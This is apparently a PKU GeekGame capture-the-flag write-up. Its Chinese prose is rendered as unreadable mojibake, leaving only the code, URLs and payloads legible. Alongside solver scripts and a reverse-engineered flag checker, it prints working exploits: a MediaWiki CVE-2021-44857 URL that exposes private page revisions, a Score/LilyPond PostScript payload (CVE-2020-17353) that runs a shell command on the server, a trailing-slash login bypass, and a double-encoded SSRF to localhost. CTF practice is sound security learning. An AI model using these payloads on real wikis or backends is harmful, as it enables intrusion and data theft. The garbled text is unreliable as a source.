>  è¢« HackerGame å’Œ GeekGame æ··åˆåŒæ‰“ï¼Œå°½åŠ›äº†ã€‚
>
>  ![image-score](./assets/score.png)

# â€ ç­¾åˆ°â€ 

ç”¨ WPS æ‰“å¼€ä½†æ— æ³•å…¨éƒ¨é€‰ä¸­ä¹Ÿæ— æ³•å¤åˆ¶ï¼Œäºæ˜¯æ¢äº†ä¸€ä¸ª SumatraPDF æ‰“å¼€å‘ç°èƒ½å¤Ÿå…¨é€‰å¤åˆ¶å‡ºæ¥

![image-signin-1](./assets/signin-1.png)

![image-signin-2](./assets/signin-2.png)



# å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆ

>  å…±æœ‰ 8 é“é¢˜ï¼Œæ¯æ¬¡éšæœºæŠ½ 7 é“é¢˜

é—®ï¼šåŒ—äº¬å¤§å­¦æŸå®éªŒå®¤æ›¾å¼€å‘äº†ä¸€ä¸ªå« gStore çš„æ•°æ®åº“è½¯ä»¶ã€‚æœ€æ—©æè¿°è¯¥è½¯ä»¶çš„è®ºæ–‡çš„ DOI ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ

ç­”ï¼š`10.14778/2002974.2002976`

å‚è€ƒï¼šhttps://dl.acm.org/doi/abs/10.14778/2002974.2002976

---

é—®ï¼šè®¿é—®ç½‘å€ `http://ctf.ä¸–ç•Œä¸€æµå¤§å­¦.com`æ—¶ï¼Œå‘è¯¥ä¸»æœºå‘é€çš„ HTTP è¯·æ±‚ä¸­ Host è¯·æ±‚å¤´çš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ

ç­”ï¼š`ctf.xn--4gqwbu44czhc7w9a66k.com`

å‚è€ƒï¼šæµè§ˆå™¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹è¯·æ±‚åŒ…

---

é—®ï¼šæ”¯æŒ WebP å›¾ç‰‡æ ¼å¼çš„æœ€æ—© Firefox ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ

ç­”ï¼š`65`

å‚è€ƒï¼šhttps://www.landiannews.com/archives/52156.html

---

é—®ï¼šè§†é¢‘ `bilibili.com/video/BV1EV411s7vu ä¹Ÿå¯ä»¥é€šè¿‡ bilibili.com/video/av_____` è®¿é—®ã€‚ä¸‹åˆ’çº¿å†…åº”å¡«ä»€ä¹ˆæ•°å­—ï¼Ÿ

ç­”ï¼š`418645518`

å‚è€ƒï¼š[BV è½¬ AV ç½‘ç«™](https://tools.jixiaob.cn/bv2av/)

---

é—®ï¼šæ¯ä¸ª Android è½¯ä»¶éƒ½æœ‰å”¯ä¸€çš„åŒ…åã€‚åŒ—äº¬å¤§å­¦è¯¾å¤–é”»ç‚¼ä½¿ç”¨çš„æœ€æ–°ç‰ˆ PKU Runner è½¯ä»¶çš„åŒ…åæ˜¯ä»€ä¹ˆï¼Ÿ

ç­”ï¼š`cn.edu.pku.pkurunner`

è§£ç­”ï¼š[ä¸‹è½½ APK](https://pku-runner.github.io/) åä½¿ç”¨ [Apktool](https://github.com/iBotPeaches/Apktool) åç¼–è¯‘åæŸ¥çœ‹`AndroidManifest.xml`

![image-xiaobei-1](./assets/xiaobei-1.png)

---

é—®ï¼šåœ¨ç¬¬ä¸€å±Š PKU GeekGame æ¯”èµ›çš„é¢˜ç›®ã€Šç”µå­æ¸¸æˆæ¦‚è®ºã€‹ä¸­ï¼Œé€šè¿‡ç¬¬ x çº§å…³å¡éœ€è¦å¤šå°‘é‡‘é’±ï¼Ÿ

è§£ç­”ï¼šè¿™ä¸€å°é—®åšäº†æŒºä¹…ã€‚ä¸‹è½½ç¬¬ä¸€å±Š PKU-GeekGame ç”µå­æ¸¸æˆæ¦‚è®ºçš„é¢˜ç›®é™„ä»¶åˆ†ææºç åå‘ç°é€šå…³æ‰€éœ€çš„é‡‘é’±æ•°æ ¹æœ¬ä¸åœ¨ä»£ç ä¸­ã€‚ç„¶åæŸ¥çœ‹å„ä¸ªé€‰æ‰‹çš„ WP ï¼Œå‘ç°ç¬¬ 16 å…³æ‰€éœ€é‡‘é’±æ˜¯ 6700 ï¼Œ 15 å…³æ‰€éœ€é‡‘é’±æ˜¯ 6100 ï¼Œè¿™ä¸¤å…³ä¹‹é—´ç›¸å·® 600 ï¼Œè¶Šé å‰é¢çš„ä¸¤å…³ä¹‹é—´ç›¸å·®çš„è¶Šå°‘ï¼Œä¸”é€šå…³æ‰€éœ€çš„é‡‘é’±æ•°åº”è¯¥éƒ½æ˜¯ 100 çš„æ•´æ•°å€ï¼Œæœ€ç»ˆåœ¨ä¸æ–­å°è¯•åæŠŠå„å…³æ‰€éœ€çš„é‡‘é’±æ•°è¯•äº†å‡ºæ¥ï¼Œåœ¨ä¸‹é¢çš„ä»£ç ä¸­

---

é—®ï¼šæˆ‘æœ‰ä¸€ä¸ªæœ‹å‹åœ¨ç¾å›½ï¼Œä»–æ— çº¿è·¯ç”±å™¨çš„ MAC åœ°å€æ˜¯ d2:94:35:21:42:43ã€‚è¯·é—®ä»–æ‰€åœ¨åœ°çš„é‚®ç¼–æ˜¯å¤šå°‘ï¼Ÿ

ç­”ï¼šä¸çŸ¥é“

---

é—®ï¼šæˆ‘åˆšåˆšåœ¨è„‘æµ·ä¸­æƒ³äº†ä¸€ä¸ªä»‹äº xxxxxxxxx åˆ° yyyyyyyyyy ä¹‹é—´çš„è´¨æ•°ã€‚çŒœçŒœå®ƒæ˜¯å¤šå°‘ï¼Ÿ

ç­”ï¼šçŒœ

æ¯æ¬¡æŠ½åˆ°è¯¥é¢˜ç›®æ—¶ç”Ÿæˆçš„èŒƒå›´éƒ½ä¸ä¸€æ ·ï¼Œä½†æ˜¯é€šè¿‡

```PYTHON
from sympy import primerange
print(len(list(primerange(xxxxxxxxx, yyyyyyyyyy))))
```

å‘ç°ä¸¤ä¸ªæ•°ä¹‹é—´çš„è´¨æ•°æ€»æ˜¯æœ‰ 8 ä¸ª

---

æŒ‰ç°åœ¨çš„æƒ…å†µæ¥çœ‹

- ä¸èƒ½æŠ½åˆ°å…³äºé‚®ç¼–çš„é‚£é“é¢˜ç›®ï¼Œæ¦‚ç‡åº”è¯¥æ˜¯ 1/8
- ä¸”å…³äºè´¨æ•°çš„é‚£é“é¢˜éœ€è¦çŒœå¯¹ï¼Œæ¦‚ç‡åº”è¯¥æ˜¯ 1/8

è¿™æ ·æ‰èƒ½å¤Ÿæ‹¿åˆ° 100 åˆ†ï¼Œéœ€è¦å†™è„šæœ¬äº†

```PYTHON
from pwn import *
import re
import time
import sympy

context.log_level = "debug"

doi = b"10.14778/2002974.2002976"
host = b"ctf.xn--4gqwbu44czhc7w9a66k.com"
package = b"cn.edu.pku.pkurunner"
av = b"418645518"
firefox = b"65"
money_dict = {
    "1": b"400",
    "2": b"600",
    "3": b"800",
    "4": b"1100",
    "5": b"1400",
    "6": b"1700",
    "7": b"2100",
    "8": b"2500",
    "9": b"3000",
    "10": b"3400",
    "11": b"3900",
    "12": b"4400",
    "13": b"4900",
    "14": b"5500",
    "15": b"6100",
    "16": b"6700"
}


def bomb():
    r = remote("prob01.geekgame.pku.edu.cn", 10001)
    r.recvuntil(b"token: ")
    r.sendline(b"ä½ çš„Token")
    r.recvuntil(b"> ")
    r.sendline("æ€¥æ€¥æ€¥".encode())

    for i in range(7):
        q = r.recvuntil(b"> ").decode()
        print(q)
        if "gStore" in q:
            r.sendline(doi)
        elif "Host" in q:
            r.sendline(host)
        elif "Runner" in q:
            r.sendline(package)
        elif "bilibili" in q:
            r.sendline(av)
        elif "Firefox" in q:
            r.sendline(firefox)
        elif "PKU GeekGame" in q:
            send_money(r, q)
        elif "è´¨æ•°" in q:
            number, p = send_prime(r, q)
            q = r.recvuntil("ã€‚".encode()).decode()
            # å¦‚æœç»“æœä¸æ­£ç¡®åˆ™é‡æ–°å¼€å§‹
            if "ä¸æ­£ç¡®" in q:
                r.close()
                time.sleep(10)
                bomb()
        # å¦‚æœæŠ½åˆ°äº†æ‰¾é‚®ç¼–çš„ä¹Ÿé‡æ–°å¼€å§‹
        else:
            print(q, "\n Fail!")
            r.close()
            time.sleep(10)
            bomb()
    r.interactive()

# å¾—åˆ°æ˜¯ç¬¬å‡ å…³ï¼Œå‘é€å¯¹åº”å…³å¡çš„é‡‘é’±æ•°
def send_money(r, question):
    level = re.findall(r"\d{1,2}", question)[1]
    r.sendline(money_dict[level])

# å¾—åˆ°ä¸¤ä¸ªæ•°å­—ï¼Œå‘é€ä¸¤ä¸ªæ•°å­—ä¹‹é—´çš„ä¸€ä¸ªè´¨æ•°
def send_prime(r, question):
    number = re.findall(r"\d+", question)[1]
    p = sympy.nextprime(int(number))
    print(p)
    r.sendline(str(p).encode())
    return number, p

bomb()
```

![image-xiaobei-2](./assets/xiaobei-2.png)



# ç¼–åŸè¯‘ç†ä¹ é¢˜è¯¾

## ç©æŒºå¤§

åˆ†é…ä¸€ä¸ªå¤§çš„å…¨å±€æ•°ç»„å³å¯

```C++
#include <iostream>
using namespace std;

double a[10000000] = {1};
int main()
{
    cout << 1;
}
//EOF
```

![image-compiler-1](./assets/compiler-1.png)



## ç©æŒºé•¿

æŸä¹ä¸Šæ‰¾åˆ°ä¸€ä¸ªï¼šhttps://www.zhihu.com/question/61427323

```C++
#include <iostream>
using namespace std;

int main()
{
    struct x struct z<x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(x(y,x(y><y*,x(y*w>v<y*,w,x{};
}
//EOF
```

![image-compiler-2](./assets/compiler-2.png)

## ç©æŒºèŠ±

åˆ†æé¢˜ç›®ç»™çš„æºç ï¼Œæœç´¢`Please include the complete backtrace with any bug report.`ï¼Œæ‰¾åˆ°äº†[è¿™ç¯‡æ–‡ç« ](https://bugzilla.redhat.com/show_bug.cgi?id=1842304)ï¼Œé‡Œé¢æœ‰æºç 

```C++
void f()
{
    alignof((
        {
            label:
                0;
        }));
    goto label;
}
//EOF
```

![image-compiler-3](./assets/compiler-3.png)



# Flag Checker

ä½¿ç”¨ [jadx](https://github.com/skylot/jadx) åç¼–è¯‘ååˆ†ææºç 

## Flag 1

ç¬¬ä¸€ä¸ª flag æ˜¯å…ˆç»è¿‡ `Base64` ç¼–ç åå†ç»è¿‡`ROT13` ï¼Œä¸è¿‡å¯¹`ROT13`è¿›è¡Œäº†å°æ”¹åŠ¨ï¼Œ`0~4`ä¸`5~9`æ˜ å°„ï¼Œæœ€ç»ˆå¾—åˆ°çš„æ˜¯

`MzkuM8gmZJ6jZJHgnaMuqy4lMKM4`

å› æ­¤é¦–å…ˆå¯¹æ•°å­—è¿›è¡Œæ›¿æ¢å¾—åˆ°

`MzkuM3gmZJ1jZJHgnaMuqy9lMKM9`

å†è¿›è¡Œ`ROT13`è§£ç ä»¥`åŠBase64`è§£ç 

![image-flag-checker](./assets/flag-checker.png)



## Flag 2

æºç ä¸­é¦–å…ˆç”Ÿæˆäº† JS ä»£ç ï¼Œç„¶åä½¿ç”¨å†…ç½®çš„ JS å¼•æ“æ‰§è¡Œäº†è¯¥ JS ä»£ç ï¼Œ è€Œ flag2 çš„ç”Ÿæˆé€»è¾‘å°±åœ¨æ­¤ JS ä»£ç ä¸­ï¼Œå› æ­¤é¦–å…ˆè·å¾—æ­¤ JS ä»£ç 

```JAVA
public class GetCode
{
    public static void main(String args[]){
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < "\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÃ†\u0094\u0099\u008e\u009dÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÃ’Â´Ãˆ\u008c\u0087\u008e\u009dÂ¬\u0080\u008b\u008aÂ®\u009bÃˆÃƒÃˆ\u0082\u008e\u009fÃˆÃƒÃˆÃˆÃƒÃˆ\u009c\u009f\u0083\u0086\u009bÃˆÃƒÃˆ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÃˆÃƒÃˆÂ¬\u0080\u009d\u009d\u008a\u008c\u009bÃˆÃƒÃˆÂ¸\u009d\u0080\u0081\u0088ÃˆÃƒÃˆ\u0085Ã‚ÃˆÂ²Ã”\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡Â¥Â¼Â Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃœÂ²Â²Ã‡Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÂ°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡ÃŸÃ†\u0092Ã†Ã†Ã’Ã’ÃÂ¥Â¼Â Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â´ÃŸÃƒÃÃšÃƒÃÃ™ÃƒÃÃ˜ÃƒÃœÃŸÃƒÃÃŸÃšÃƒÃÃ™ÃƒÃœÃÃƒÃÃ™ÃƒÃ™Ã˜ÃƒÃœÃƒÃœÃœÃƒÃšÃƒÃ™ÃŸÃƒÃ›ÃƒÃÃŸÃ™ÃƒÃ™ÃƒÃ›ÃÃƒÃŸÃƒÃÃƒÃ™Ã˜ÃƒÃœÃƒÃÃ™ÃƒÃ›ÃƒÃ™ÃƒÃœÃœÃƒÃÃœÃÂ²Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ„ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0092Ã†Ã†ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃšÂ²Ã•Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã™Â²Ã†\u0092".length(); i++) {
            sb.append((char) ("\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÃ†\u0094\u0099\u008e\u009dÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÃ’Â´Ãˆ\u008c\u0087\u008e\u009dÂ¬\u0080\u008b\u008aÂ®\u009bÃˆÃƒÃˆ\u0082\u008e\u009fÃˆÃƒÃˆÃˆÃƒÃˆ\u009c\u009f\u0083\u0086\u009bÃˆÃƒÃˆ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÃˆÃƒÃˆÂ¬\u0080\u009d\u009d\u008a\u008c\u009bÃˆÃƒÃˆÂ¸\u009d\u0080\u0081\u0088ÃˆÃƒÃˆ\u0085Ã‚ÃˆÂ²Ã”\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡Â¥Â¼Â Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃœÂ²Â²Ã‡Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÂ°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÂ´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡ÃŸÃ†\u0092Ã†Ã†Ã’Ã’ÃÂ¥Â¼Â Â¡Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã›Â²Â²Ã‡Â´ÃŸÃƒÃÃšÃƒÃÃ™ÃƒÃÃ˜ÃƒÃœÃŸÃƒÃÃŸÃšÃƒÃÃ™ÃƒÃœÃÃƒÃÃ™ÃƒÃ™Ã˜ÃƒÃœÃƒÃœÃœÃƒÃšÃƒÃ™ÃŸÃƒÃ›ÃƒÃÃŸÃ™ÃƒÃ™ÃƒÃ›ÃÃƒÃŸÃƒÃÃƒÃ™Ã˜ÃƒÃœÃƒÃÃ™ÃƒÃ›ÃƒÃ™ÃƒÃœÃœÃƒÃÃœÃÂ²Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Â²Ã‡\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÃÃ‡\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÃÃ„ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃÂ²Ã†Â´Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃŸÂ²Â²Ã‡Â°ÃŸ\u0097\u008eÃ—Ãœ\u008a\u0097ÃœÃ†\u0092Ã†Ã†ÃÂ°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´ÃšÂ²Ã•Â°ÃŸ\u0097Ã˜ÃÃ›\u008dÂ´Ã™Â²Ã†\u0092".charAt(i) ^ 239));
        }
        System.out.println(sb);
    }
}
```

å¾—åˆ°äº†ä¸‹é¢ç»è¿‡æ··æ·†çš„ JS ä»£ç 

```JAVASCRIPT
function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}
```

åˆ†æä»£ç é€»è¾‘åï¼Œå‘ç°å…¶åŠŸèƒ½å°±æ˜¯åˆ¤æ–­ç»™å®šçš„å­—ç¬¦ä¸²æ˜¯å¦ä¸æºç ä¸­å›ºå®šä½ç½®çš„å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ç›¸ç­‰

å› æ­¤ç¼–å†™è„šæœ¬

```PYTHON
code = "function checkflag2(_0xa83ex2){var _0x724b=['charCodeAt','map','','split','stringify','Correct','Wrong','j-'];return (JSON[_0x724b[4]](_0xa83ex2[_0x724b[3]](_0x724b[2])[_0x724b[1]](function(_0xa83ex3){return _0xa83ex3[_0x724b[0]](0)}))== JSON[_0x724b[4]]([0,15,16,17,30,105,16,31,16,67,3,33,5,60,4,106,6,41,0,1,67,3,16,4,6,33,232][_0x724b[1]](function(_0xa83ex3){return (checkflag2+ _0x724b[2])[_0x724b[0]](_0xa83ex3)}))?_0x724b[5]:_0x724b[6])}"

position = [0, 15, 16, 17, 30, 105, 16, 31, 16, 67, 3, 33, 5, 60, 4, 106, 6, 41, 0, 1, 67, 3, 16, 4, 6, 33, 232]

for i in position:
    print(code[i], end="")
```

å¾—åˆ°
`flag{javascript-obfuscator}`



# æ™ºæ…§æ£€æµ‹å™¨

è¿™æ˜¯ä¸€ä¸ªä¸‰ç»´è¿·å®«ï¼Œç©çš„æ—¶å€™å‘ç°èƒ½å¤Ÿç©¿å¢™ï¼Œä¸‹é¢æ˜¯ Demo

![image-maze-1](./assets/maze-1.png)

åˆ†ææºç åå‘ç°æ˜¯ç¬¬ 422 è¡Œä»£ç å¯¼è‡´çš„

![image-maze-2](./assets/maze-2.png)

- `CurPos`ä¿å­˜äº†å½“å‰ä½ç½®ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨

- `NewPos`ä¿å­˜äº†å°†è¦æ‰§è¡Œä¸€æ¬¡ç§»åŠ¨æŒ‡ä»¤åçš„æ–°çš„ä½ç½®ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåˆ—è¡¨

- åˆ—è¡¨çš„å€¼éƒ½æ˜¯`[z, y ,x]`ç±»å‹çš„ï¼Œ z è¡¨ç¤º z è½´åæ ‡ï¼Œ y è¡¨ç¤ºç«–ç›´æ–¹å‘çš„åæ ‡ï¼Œ x è¡¨ç¤ºæ°´å¹³æ–¹å‘çš„åæ ‡ï¼Œæ¯”å¦‚åœ¨ Demo ä¸­å‡ºç”Ÿä½ç½®çš„åæ ‡å°±æ˜¯`[0, 1, 3]`

åœ¨ Demo ä¸­ï¼Œç°åœ¨ä¸€æ¬¡æ€§è¾“å…¥äº†ä¸¤ä¸ªç§»åŠ¨æŒ‡ä»¤ï¼š` es` ï¼Œå³é¦–å…ˆå‘å³ç§»åŠ¨ï¼Œç„¶åå‘ä¸‹ç§»åŠ¨ã€‚ä¸‹é¢åˆ†æä»£ç æ‰§è¡Œç§»åŠ¨æŒ‡ä»¤çš„æµç¨‹

1. `CurPos`æ˜¯`[0ï¼Œ1ï¼Œ3]`
2. å°è¯•å‘å³ç§»åŠ¨ï¼Œæ­¤æ—¶`NewPos`æ˜¯`[0,1,4]`
3. åˆ¤æ–­`NewPos`çš„ä½ç½®ä¸æ˜¯å¢™ï¼Œå› æ­¤èƒ½å¤Ÿç§»åŠ¨
4. æ‰§è¡Œ`CurPos = NewPos`
5. å°è¯•å‘ä¸‹ç§»åŠ¨ï¼Œæ­¤æ—¶ `NewPos`æ˜¯`[0,2,4]`
6. åˆ¤æ–­`NewPos`çš„ä½ç½®æ˜¯å¢™ï¼Œä¸èƒ½å¤Ÿç§»åŠ¨ï¼Œå› æ­¤ç»“æŸæ­¤è½®ç§»åŠ¨å¹¶æŒ‰`CurPos`ç»˜åˆ¶è¿·å®«

æ³¨æ„ç¬¬ 4 æ­¥å¯¼è‡´äº†`CurPos`å’Œ`NewPos`éƒ½æŒ‡å‘ä¸€ä¸ªåˆ—è¡¨ï¼Œå› æ­¤æ“ä½œ`NewPos`å°±ç›¸å½“äºæ“ä½œ`CurPos`ï¼Œæ‰§è¡Œç¬¬ 5 æ­¥åï¼Œ`CurPos`å°±æ˜¯`[0,2,4]`ï¼Œä¹Ÿå°±æ˜¯å¢™çš„ä½ç½®ï¼Œå› æ­¤å¯¼è‡´äº†ç©¿å¢™

æ­¤æ—¶é¢˜ç›®å°±éå¸¸ç®€å•äº†

## ç ´åè€…

ç”±äºç¬¬ä¸€å…³åªæœ‰ä¸€å±‚ï¼Œå› æ­¤æ­£å¸¸ç§»åŠ¨ä¸€æ¬¡åä¸Šè·³ä¸€å±‚å³å¯å¯¼è‡´é”™è¯¯

![image-maze-3](./assets/maze-3.png)



## è°ƒåœè€…

ç¬¬ä¸‰å…³ä¸æ–­ä¸Šè·³å³å¯åˆ°è¾¾ç¬¬ 80 å±‚ï¼Œåœ¨è¿™æœŸé—´ä¸æ–­æ¥è¿‘å¯¹è¾¹ï¼Œé˜²æ­¢æ­¥æ•°ä¸å¤Ÿç”¨

![image-maze-4](./assets/maze-4.png)



# ä¼é¹…æ–‡æ¡£

>  ç¬¬ä¸€æ­¥

æœç´¢`é€šè¿‡ä»¥ä¸‹é“¾æ¥è®¿é—®é¢˜ç›®æœºå¯†flagï¼š`å¾—åˆ°å—ä¿æŠ¤çš„é“¾æ¥çš„ç¬¬ä¸€éƒ¨åˆ†

![image-doc-1](./assets/doc-1.png)

æœç´¢`æœºå¯†flagé“¾æ¥å·²ç»å—åˆ°ä¿æŠ¤ï¼Œåªå…è®¸å‡ºé¢˜äººè®¿é—®`å¾—åˆ°å—ä¿æŠ¤çš„é“¾æ¥çš„ç¬¬äºŒéƒ¨åˆ†

![image-doc-2](./assets/doc-2.png)



> ç¬¬äºŒæ­¥

è®¿é—®å¾—åˆ°çš„å—ä¿æŠ¤çš„é“¾æ¥`https://geekgame.pku.edu.cn/service/template/prob_kAiQcWHobsBzRJEs_next`

![image-doc-3](./assets/doc-3.png)

ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª`challeng.har`æ–‡ä»¶ï¼Œæµè§ˆå™¨å¯¼å…¥åæœç´¢å…³é”®å­—`Below is your flag`æ‰¾åˆ°åŒ…å«è¡¨æ ¼æ•°æ®çš„å“åº”ä½“

![image-doc-4](./assets/doc-4.png)

åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°å“ªäº›è¡¨æ ¼è¢«å¡«å……äº†é»‘è‰²

å› æ­¤è‡ªå·±å†™äº†ä¸€ä¸ªç›¸è¿‘çš„æ–‡æ¡£ï¼Œä¿è¯è¡Œæ•°è¶³å¤Ÿå¤šï¼Œç„¶åæŠ“åŒ…è¿›è¡Œæ›¿æ¢ï¼Œå°è¯•å¹¶ä¿®æ”¹äº†å¾ˆå¤šæ¬¡åæ‰æˆåŠŸæ¸²æŸ“å‡ºé¡µé¢

![image-doc-5](./assets/doc-5.png)

> è¿™æ ·åšå¤±è´¥ç‡å¤ªé«˜ã€‚åº”è¯¥å¯ä»¥è·å¾—æ‰€æœ‰è¢«å¡«å……äº†é»‘è‰²çš„è¡¨æ ¼çš„åæ ‡ï¼Œç„¶åè‡ªå·±ç¼–å†™è„šæœ¬ç”Ÿæˆä½å›¾



# ç§æœ‰ç¬”è®°

## çŸ¥è¯†ä¸ä½ åˆ†äº«

å‚è€ƒï¼šhttps://www.mediawiki.org/wiki/2021-12_security_release/FAQ/zh

`é¦–é¡µ`çš„`old_id`æ˜¯`1`ï¼Œæ˜¯å…¬å¼€çš„
`flag`çš„`old_id`æ˜¯`2`ï¼Œæ˜¯ç§æœ‰çš„

éœ€è¦è®¿é—®å…¬å¼€é¡µé¢æ¥åˆ©ç”¨`CVE-2021-44857`

paypload ä¸º`index.php?title=é¦–é¡µ&action=mcrundo&undoafter=2&undo=1`
![](./assets/mediawiki-1.png)

## æ¥æˆ‘å®¶åšå®¢å§

å‚è€ƒï¼šhttps://www.mediawiki.org/wiki/Extension:Score/2021_security_advisory

åˆ©ç”¨äº†`CVE-2020-17353`

å°†åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„`PostScript`ä»£ç åµŒå…¥åˆ°`Score`æ ‡ç­¾ä¸­çš„`Lilypond`æ–‡æœ¬ä¸­

```
<score raw="0">
ringsps = #"
(%pipe%cp /flag2 /var/www/html/flag2) (w) file
"
rings = \markup {
  \with-dimensions #'(-0.2 . 1.6) #'(0 . 1.2)
  \postscript #ringsps
}
\relative c'' {
  c2^\rings
  a2_\rings
}
</score>
```

ä¿å­˜åï¼Œåç«¯å³ä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå°†`flag2`å¤åˆ¶åˆ°ç½‘é¡µæ–‡ä»¶å¤¹ç›®å½•ä¸‹

![](./assets/mediawiki-2.png)

è®¿é—®`flag2`
![](./assets/mediawiki-3.png)

# ä¼ä¸šçº§ç†è§£

## èµ‹èƒ½ç®¡ç†åå°

URL æœ€åæ·»åŠ ä¸€ä¸ªæ–œæ å³å¯ç»•è¿‡ç™»å½•é¡µé¢è®¿é—®ç®¡ç†åå°

![image-enterprise-1](./assets/enterprise-1.png)

åŒæ ·å¯è·å¾—åç«¯ä»£ç 

![image-enterprise-2](./assets/enterprise-2.png)

## ç›˜æ´»ä¸šåŠ¡å¢é•¿

åç«¯ä»£ç è®¿é—®äº†`http://localhost:8079`ä¸Šçš„`backend`æœåŠ¡ï¼Œè€Œç°åœ¨éœ€è¦è®©åç«¯ä»£ç è®¿é—®`http://localhost:8080`ä¸Šçš„`bonus`æœåŠ¡

åˆ†æåç«¯ä»£ç ï¼Œå‘ç°å°†`index`å ä½ç¬¦çš„å€¼ä¼ é€’ç»™äº†`WebClient`çš„`uri`å‡½æ•°ï¼Œç»æµ‹è¯•ï¼Œå¦‚æœæ­¤å‡½æ•°çš„å‚æ•°å¦‚æœæ˜¯ä¸€ä¸ªåˆæ³•çš„`url`ï¼Œåˆ™ä¼šè¦†ç›–æ‰`baseUrl`å‡½æ•°ä¸­ä¼ é€’çš„å€¼ï¼ŒåŒæ—¶æµ‹è¯•æ—¶å‘ç°åç«¯å¯¹`index`çš„å€¼è¿›è¡Œäº†ä¸¤æ¬¡ URL è§£ç ï¼Œå› æ­¤éœ€è¦å¯¹`http://localhost:8080`è¿›è¡Œä¸¤æ¬¡ URL ç¼–ç ï¼Œå¾—åˆ°`http%253A%252F%252Flocalhost%253A8080`ï¼Œä¸è¦å¿˜äº†è¦åœ¨æœ€åæ·»åŠ ä¸€ä¸ªæ–œæ ç»•è¿‡ç™»å½•é¡µé¢

